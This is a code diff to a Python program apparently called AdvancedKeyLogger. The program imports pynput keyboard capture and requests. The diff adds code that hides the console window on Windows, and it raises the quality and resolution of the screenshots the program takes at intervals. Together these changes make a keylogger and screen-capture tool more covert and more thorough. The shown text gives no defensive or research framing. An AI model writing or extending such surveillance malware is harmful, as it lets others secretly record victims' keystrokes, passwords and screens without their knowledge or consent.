@@ -17,6 +17,14 @@ from pynput import keyboard
 import requests
 import json
 
+# Hide console window on Windows
+if sys.platform == 'win32':
+    try:
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+
 # Add current directory and parent to path for modules
 # This works both when running from src/ and when built by builder
 current_dir = os.path.dirname(os.path.abspath(__file__))
@@ -138,7 +146,9 @@ class AdvancedKeyLogger:
             try:
                 self.screenshot_capture = ScreenshotCapture(
                     callback=self._on_screenshot_taken,
-                    interval=SCREENSHOT_INTERVAL
+                    interval=SCREENSHOT_INTERVAL,
+                    quality=85,  # Higher quality (1-100)
+                    max_size=(1920, 1080)  # Full HD resolution
                 )
                 if self.screenshot_capture.start():
                     print("[+] Screenshot capture started")
